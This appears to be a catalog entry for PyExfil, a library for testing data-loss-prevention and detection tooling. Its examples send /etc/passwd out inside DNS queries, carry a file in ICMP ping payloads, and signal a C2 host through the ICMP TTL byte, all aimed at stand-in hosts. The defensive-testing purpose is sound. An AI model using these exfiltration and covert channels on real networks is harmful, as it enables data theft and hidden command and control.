---
name: "pyexfil"
categories:
  - blackarch-networking
version: "81.2ef1b8c"
homepage: "https://github.com/ytisf/PyExfil"
packaged-by: [blackarch]
blackarch-builddate: "2020-08-29"
build-system: python
license: MIT
meta-checked: "2026-11-09"
github-repo: "ytisf/PyExfil"
github-stars: 812
github-pushed: "2026-06-23"
github-archived: false
github-issues: 3
github-match: "exact"
gh-checked: "2026-11-07"
worth: 5.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 1
gh-activity-checked: "2026-11-09"
---

# pyexfil

> Python library of data-exfiltration and covert-communication techniques for testing DLP and detection tooling.

## What it's for

PyExfil (ytisf) packages dozens of exfiltration and C2 channels — DNS queries, ICMP echo payloads, HTTP cookies, NTP, HTTPS/QUIC, BGP, mDNS, the ICMP TTL byte, plus physical and steganographic carriers — behind a common Python API. It is explicitly a detection-testing playground: deploy it on a node inside your own network, push synthetic data through each channel, and record which monitoring controls catch which technique. It is not a finished red-team framework — the README itself calls it a PoC, and modules range from stable to experimental.

## Typical use cases

### Exfiltrate a file inside DNS queries

Push a file out of a network encoded in the question names of ordinary-looking DNS traffic.

```python
from pyexfil.network.DNS.dns_exfil import dns_exfil, dns_server

dns_exfil(host="ns.example.com", path_to_file="/etc/passwd")
dns_server(host="ns.example.com", port=53, play_dead=True)  # receiving side
```

Outcome: the client chunks the file into DNS queries aimed at `ns.example.com` that Wireshark/tcpdump render as normal packets; on the collector, `dns_server` binds port 53 and harvests the queries for reassembly (`play_dead=True` keeps it from answering, so it stays invisible to the sender's stub resolver).

### Exfiltrate over ICMP echo requests

Carry file data inside ping payloads.

```python
from pyexfil.network.ICMP.icmp_exfiltration import send_file, init_listener

send_file("198.51.100.10", src_ip_addr="198.51.100.20",
          file_path="data.zip", max_packetsize=512, SLEEP=0.1)
init_listener("198.51.100.10", saving_location="/tmp/")  # receiving side
```

Outcome: the client emits ICMP echo requests carrying up to 512 payload bytes each toward 198.51.100.10; the listener reassembles them and writes the recovered file under /tmp.

### Signal a C2 over the ICMP TTL byte

Exchange single-byte messages without any payload.

```python
from pyexfil.Comm.icmp_ttl import ICMP_TTL

sender = ICMP_TTL(key='Password1', dst_addr='c2.example.com')
sender.Run(data=183)
```

Outcome: transmits the value 183 encoded in the TTL field of ICMP packets; the peer decodes it with `listener = ICMP_TTL(key='Password1', dst_addr='c2.example.com')` followed by `listener.Listen()`.

### Generate synthetic PII/PCI test data

Produce realistic fake data sets so detection drills never touch real records.

```python
from pyexfil.includes import CreateTestData

c = CreateTestData(rows=1000, output_location="/tmp/list.csv")
c.Run()
```

Outcome: writes /tmp/list.csv with 1000 rows structured like PII and PCI data — feed it through any PyExfil channel and it should trip DLP and exfiltration alerts without risking real data.

*No corpus evidence — derived from upstream documentation.*
